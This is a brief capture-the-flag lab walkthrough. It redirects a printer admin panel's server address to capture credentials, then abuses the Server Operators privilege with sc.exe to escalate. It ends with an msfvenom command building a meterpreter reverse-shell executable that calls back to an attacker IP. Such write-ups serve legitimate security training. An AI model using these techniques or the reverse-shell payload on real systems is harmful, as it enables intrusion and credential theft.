Many outputs. But we can focus on SMC(445), WRM(5985), and HTTP(80). Let's see what's http hosting.

It's an IIS server which is hosting printer admin panel. We seem to not have to enumerate this server.

On the settings panel, I found setting fields for simple printer connection. It's common that the printer sends credentials for accessing client server to get files like PDF to copy. And for usability and simplicity, it might not encoded.

Let's change Server Address parameter to our IP and see what's sent to our machine.

The user has Server Operators privilege. This privilege let us to use sc.exe, which is for service commandline tool.

We can abuse this for PE. We can create meterpreter reverse shell exe file, and get connection with multi/handler in msfconsole.

└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.18.36 LPORT=4444 -f exe > shell.exe
